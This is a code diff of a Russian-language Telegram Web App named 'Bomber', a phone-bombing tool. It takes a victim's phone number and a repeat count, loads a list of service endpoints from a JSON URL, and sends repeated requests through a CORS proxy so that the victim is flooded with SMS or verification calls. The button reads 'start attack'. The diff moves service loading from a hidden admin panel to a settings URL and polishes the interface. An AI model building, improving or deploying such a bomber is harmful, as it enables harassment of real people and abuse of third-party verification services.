@@ -2,8 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes,viewport-fit=cover">
-    <title>Bomber · CRUX Edition</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+    <title>Bomber · crux edition</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
@@ -26,8 +26,6 @@
             align-items: center;
             justify-content: center;
             padding: 1rem;
-            position: relative;
-            user-select: none;
             overflow: hidden;
             -webkit-font-smoothing: antialiased;
         }
@@ -39,28 +37,27 @@
 
         .card { 
             width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10;
-            animation: entry-fade 1.2s ease-out;
+            animation: entry-fade 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            will-change: transform, opacity; transform: translateZ(0);
         }
 
         @keyframes entry-fade {
-            0% { opacity: 0; transform: scale(0.95); }
-            100% { opacity: 1; transform: scale(1); }
+            0% { opacity: 0; transform: scale(0.95) translateY(10px); filter: blur(10px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
         }
 
         .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 4px; }
-        .title { 
-            font-size: 2.2rem; font-weight: 700; color: #f0f0ff; 
-            text-shadow: 0 0 10px var(--accent); line-height: 1;
-            cursor: pointer;
-        }
-        
-        .bomb-emoji { font-size: 2.2rem; cursor: pointer; transition: transform 0.3s; display: inline-block; }
-        .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out; }
+        .title { font-size: 2.2rem; font-weight: 700; color: #f0f0ff; text-shadow: 0 0 10px var(--accent); line-height: 1; }
+        .bomb-emoji { font-size: 2.2rem; cursor: pointer; transition: transform 0.3s; display: inline-block; line-height: 1; }
+        .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out forwards; }
+
         @keyframes moon-charge {
             0% { transform: scale(1); }
-            50% { transform: scale(1.3); filter: brightness(1.5); }
+            40% { transform: scale(1.3); filter: brightness(1.5); }
             100% { transform: scale(1); }
         }
+
+        .row { display: flex; justify-content: center; align-items: stretch; gap: 6px; margin-bottom: 1.5rem; position: relative; z-index: 20; }
 
         .phone-field {
             display: flex; align-items: center; background: rgba(18, 18, 30, 0.8);
@@ -68,48 +65,46 @@
             width: 185px; padding: 2px; transition: 0.3s;
         }
         
-        .phone-field.invalid { border-color: #ff4444; animation: shake 0.4s; }
+        .phone-field.invalid { border-color: #ff4444 !important; animation: shake 0.4s; }
         @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-4px);} 75% {transform: translateX(4px);} }
 
-        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; position: relative; }
+        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; color: #f0f0ff; position: relative; }
         .code-dropdown {
             position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); 
-            border: 2px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 120px;
+            border: 2px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 160px;
         }
         .code-selector.active .code-dropdown { display: block; }
-        .code-item { padding: 10px; font-size: 0.75rem; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .code-item { padding: 10px; font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); text-align: left; }
 
         .phone-number-input { background: transparent; border: none; color: #fff; font-size: 0.8rem; padding: 5px; outline: none; width: 100%; }
-
-        .row { display: flex; justify-content: center; align-items: stretch; gap: 6px; margin-bottom: 1.5rem; }
 
         .repeats {
             display: flex; align-items: center; gap: 3px; background: rgba(20, 20, 35, 0.7);
             border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px;
         }
         .repeats-input { width: 30px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: 700; font-size: 0.8rem; }
-        .repeats-max { font-size: 0.6rem; color: #fff; background: rgba(180,180,255,0.1); padding: 3px 6px; border-radius: 6px; }
+        .repeats-max { font-size: 0.6rem; color: #fff; background: rgba(180,180,255,0.1); padding: 3px 6px; border-radius: 6px; display: flex; align-items: center; gap: 4px; }
 
         .attack-btn {
             width: 210px; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
             border-radius: 100px; color: #fff; padding: 12px; cursor: pointer; font-weight: 700; 
-            text-transform: uppercase; letter-spacing: 2px; transition: 0.2s;
+            text-transform: uppercase; letter-spacing: 2px; transition: 0.2s; transform: translateZ(0);
         }
         .attack-btn:active { transform: scale(0.96); }
 
-        #adminPanel {
-            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
-            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9000; padding: 20px;
-        }
-        #jsonInput { width: 100%; height: 200px; background: #000; color: #0f0; font-family: monospace; font-size: 0.7rem; border: 1px solid var(--accent); padding: 10px; border-radius: 10px; }
+        .settings-trigger { position: fixed; bottom: 20px; right: 20px; font-size: 1.5rem; color: var(--accent); opacity: 0.5; padding: 10px; cursor: pointer; }
+        
+        .settings-modal { position: fixed; inset: 0; background: rgba(5, 5, 15, 0.5); backdrop-filter: blur(20px); display: none; align-items: center; justify-content: center; z-index: 3000; }
+        .settings-modal.active { display: flex; }
+        .settings-content { background: rgba(20, 20, 35, 0.85); border: 1px solid var(--accent); border-radius: 28px; padding: 2rem; width: 320px; text-align: center; transform: translateZ(0); }
 
         .loading-overlay {
-            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.9);
+            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
             display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000;
         }
         .loading-overlay.show { display: flex; }
         .progress-bg { width: 220px; height: 4px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-top: 15px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: var(--accent); transition: width 0.3s; }
+        .progress-fill { height: 100%; width: 0%; background: var(--accent); transition: width 0.3s ease; }
     </style>
 </head>
 <body>
@@ -118,48 +113,49 @@
 
 <div class="card">
     <div class="header">
-        <span class="title" id="mainTitle">Bomber</span>
+        <span class="title">Bomber</span>
         <span class="bomb-emoji" id="bombLogo">💣</span>
     </div>
     
     <div class="row">
         <div class="phone-field" id="phoneBox">
             <div class="code-selector" id="codeSelector">
-                <span id="selectedCode">🇷🇺 +7</span>
+                <span id="selectedCode">+7</span>
                 <div class="code-dropdown" id="codeDropdown">
-                    <div class="code-item" data-code="+7">🇷🇺 +7</div>
-                    <div class="code-item" data-code="+380">🇺🇦 +380</div>
-                    <div class="code-item" data-code="+375">🇧🇾 +375</div>
-                    <div class="code-item" data-code="+7">🇰🇿 +7</div>
+                    <div class="code-item" data-code="+7">🇷🇺 +7 (РФ)</div>
+                    <div class="code-item" data-code="+380">🇺🇦 +380 (УКР)</div>
+                    <div class="code-item" data-code="+375">🇧🇾 +375 (БЛР)</div>
+                    <div class="code-item" data-code="+7">🇰🇿 +7 (КЗ)</div>
                 </div>
             </div>
-            <input class="phone-number-input" type="text" id="localNumber" placeholder="900 000 00 00" inputmode="numeric">
+            <input class="phone-number-input" type="text" id="localNumber" placeholder="912 345 67 89" inputmode="numeric">
         </div>
         
-        <div class="row" style="margin-bottom:0">
-            <div class="repeats">
-                <input class="repeats-input" type="number" id="repeat" value="1" min="1" max="100">
-                <span class="repeats-max">
-                    <span id="servicesCounter">0</span>
-                </span>
-            </div>
+        <div class="repeats">
+            <input class="repeats-input" type="number" id="repeat" value="3" min="1" max="100">
+            <span class="repeats-max">
+                <span id="servicesCounter">0</span>
+            </span>
         </div>
     </div>
     
     <button class="attack-btn" id="go">НАЧАТЬ АТАКУ</button>
 </div>
 
-<div id="adminPanel">
-    <h3 style="margin-bottom:10px">Вставь JSON сюда:</h3>
-    <textarea id="jsonInput" placeholder='[{"url": "...", "method": "POST"}]'></textarea>
-    <button class="attack-btn" id="saveJson" style="margin-top:15px; width:100%">СОХРАНИТЬ</button>
-    <button id="closeAdmin" style="margin-top:10px; color:#aaa; background:none; border:none;">Закрыть</button>
+<div class="settings-trigger" id="openSettings">⚙</div>
+
+<div class="settings-modal" id="settingsModal">
+    <div class="settings-content">
+        <h3 style="margin-bottom:20px">Настройки</h3>
+        <input type="text" id="repoUrl" style="width:100%; padding:10px; margin-bottom:15px; background:rgba(0,0,0,0.3); border:1px solid #5f5f8f; color:#fff; border-radius:10px; outline:none;" placeholder="JSON URL (напр. services.json)">
+        <button class="attack-btn" id="saveSettings" style="width:100%">ОК</button>
+    </div>
 </div>
 
 <div class="loading-overlay" id="loadingOverlay">
-    <div id="statusTxt" style="color:var(--accent); font-family:monospace;">Атака запущена...</div>
+    <div id="statusTxt" style="font-family: monospace;">Подготовка...</div>
     <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
-    <button id="stopAttack" style="margin-top:20px; color:#ff4444; background:none; border:1px solid #ff4444; padding:5px 15px; border-radius:20px;">СТОП</button>
+    <button id="stopAttack" style="margin-top:20px; color:#ff4444; background:none; border:none; cursor:pointer;">ОСТАНОВИТЬ</button>
 </div>
 
 <script>
@@ -170,59 +166,47 @@
 
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
-        let particles = [], loadedServices = [], isAttacking = false;
+        let particles = [], isAttacking = false, loadedServices = [];
         const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
 
         function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        window.addEventListener('resize', resize); resize();
+        window.addEventListener('resize', resize, { passive: true }); resize();
 
-        class P {
-            constructor() { this.x = Math.random()*canvas.width; this.y = Math.random()*canvas.height; this.v = 0.4; }
-            update() { this.y -= this.v; if(this.y<0) this.y=canvas.height; }
-            draw() { ctx.fillStyle = "#b0b0ff"; ctx.globalAlpha = 0.2; ctx.fillRect(this.x, this.y, 1.2, 1.2); }
+        class Particle {
+            constructor() { this.reset(); }
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.v = 0.2 + Math.random() * 0.4;
+            }
+            update() { this.y -= this.v; if (this.y < 0) this.reset(); }
+            draw() { ctx.fillStyle = '#b0b0ff'; ctx.fillRect(this.x, this.y, 1.2, 1.2); }
         }
-        for(let i=0; i<50; i++) particles.push(new P());
+
+        for(let i=0; i<50; i++) particles.push(new Particle());
 
         function anim() {
-            ctx.fillStyle = "#0a0c14"; ctx.globalAlpha = 1; ctx.fillRect(0,0,canvas.width,canvas.height);
-            particles.forEach(p => { p.update(); p.draw(); });
+            ctx.fillStyle = '#0a0c14';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.globalAlpha = 0.4;
+            for(let p of particles) { p.update(); p.draw(); }
             requestAnimationFrame(anim);
         }
         anim();
 
-        const loadSaved = () => {
-            const data = localStorage.getItem('bomber_services');
-            if(data) {
-                try {
-                    loadedServices = JSON.parse(data);
-                    document.getElementById('servicesCounter').innerText = loadedServices.length;
-                } catch(e) { loadedServices = []; }
+        const loadServices = async () => {
+            const url = localStorage.getItem('crux_url') || 'services.json';
+            try {
+                const r = await fetch(url);
+                loadedServices = await r.json();
+                document.getElementById('servicesCounter').innerText = loadedServices.length;
+            } catch(e) { 
+                console.log("JSON не найден, загрузите его в настройках");
+                loadedServices = []; 
+                document.getElementById('servicesCounter').innerText = "0";
             }
         };
-        loadSaved();
-
-        let timer;
-        const title = document.getElementById('mainTitle');
-        title.onmousedown = title.ontouchstart = () => {
-            timer = setTimeout(() => {
-                document.getElementById('adminPanel').style.display = 'flex';
-                tg.HapticFeedback.notificationOccurred('success');
-            }, 2000);
-        };
-        title.onmouseup = title.ontouchend = () => clearTimeout(timer);
-
-        document.getElementById('saveJson').onclick = () => {
-            const val = document.getElementById('jsonInput').value;
-            try {
-                const parsed = JSON.parse(val);
-                localStorage.setItem('bomber_services', JSON.stringify(parsed));
-                loadSaved();
-                document.getElementById('adminPanel').style.display = 'none';
-                tg.showAlert("Успешно загружено " + parsed.length + " сервисов!");
-            } catch(e) { tg.showAlert("Ошибка в JSON!"); }
-        };
-
-        document.getElementById('closeAdmin').onclick = () => document.getElementById('adminPanel').style.display = 'none';
+        loadServices();
 
         async function sendReq(s, phone) {
             const url = proxyUrl + s.url.replace('%phone%', phone);
@@ -238,22 +222,24 @@
 
         document.getElementById('go').onclick = async () => {
             if(loadedServices.length === 0) {
-                tg.showAlert("Сначала загрузи JSON (зажми Bomber)");
+                tg.showAlert("Сначала укажите URL JSON-файла в настройках (⚙)");
                 return;
             }
-            const phoneStr = document.getElementById('localNumber').value.replace(/\D/g,'');
-            if(phoneStr.length < 7) {
+
+            const numStr = document.getElementById('localNumber').value.replace(/\D/g,'');
+            if(numStr.length < 7) {
+                tg.HapticFeedback.notificationOccurred('warning');
                 document.getElementById('phoneBox').classList.add('invalid');
-                setTimeout(()=>document.getElementById('phoneBox').classList.remove('invalid'), 400);
+                setTimeout(() => document.getElementById('phoneBox').classList.remove('invalid'), 400);
                 return;
             }
-            
+
             const reps = parseInt(document.getElementById('repeat').value) || 1;
-            const fullPhone = document.getElementById('selectedCode').innerText.replace(/\D/g,'') + phoneStr;
-            
+            const fullPhone = document.getElementById('selectedCode').innerText.replace(/\D/g,'') + numStr;
+
             isAttacking = true;
             document.getElementById('loadingOverlay').classList.add('show');
-            tg.HapticFeedback.impactOccurred('medium');
+            tg.HapticFeedback.impactOccurred('heavy');
 
             const total = loadedServices.length * reps;
             let count = 0;
@@ -265,23 +251,44 @@
                     count++;
                     document.getElementById('progressFill').style.width = (count/total*100) + '%';
                     document.getElementById('statusTxt').innerText = `Атака: ${count}/${total}`;
-                    await new Promise(r => setTimeout(r, 200));
+                    await new Promise(r => setTimeout(r, 250));
                 }
             }
+
             isAttacking = false;
             document.getElementById('loadingOverlay').classList.remove('show');
+            tg.HapticFeedback.notificationOccurred('success');
         };
 
+        // Интерфейс
+        document.getElementById('openSettings').onclick = () => {
+            document.getElementById('repoUrl').value = localStorage.getItem('crux_url') || '';
+            document.getElementById('settingsModal').classList.add('active');
+        };
+        document.getElementById('saveSettings').onclick = () => {
+            localStorage.setItem('crux_url', document.getElementById('repoUrl').value);
+            loadServices();
+            document.getElementById('settingsModal').classList.remove('active');
+        };
         document.getElementById('codeSelector').onclick = (e) => {
             e.stopPropagation();
             document.getElementById('codeSelector').classList.toggle('active');
         };
-
         document.querySelectorAll('.code-item').forEach(i => {
-            i.onclick = () => document.getElementById('selectedCode').innerText = i.dataset.code;
+            i.onclick = () => {
+                document.getElementById('selectedCode').innerText = i.dataset.code;
+                document.getElementById('codeSelector').classList.remove('active');
+            };
         });
-
-        document.getElementById('stopAttack').onclick = () => isAttacking = false;
+        document.getElementById('stopAttack').onclick = () => {
+            isAttacking = false;
+            document.getElementById('loadingOverlay').classList.remove('show');
+        };
+        document.getElementById('bombLogo').onclick = () => {
+            tg.HapticFeedback.selectionChanged();
+            document.getElementById('bombLogo').classList.add('active-anim');
+            setTimeout(() => document.getElementById('bombLogo').classList.remove('active-anim'), 700);
+        };
     })();
 </script>
 </body>
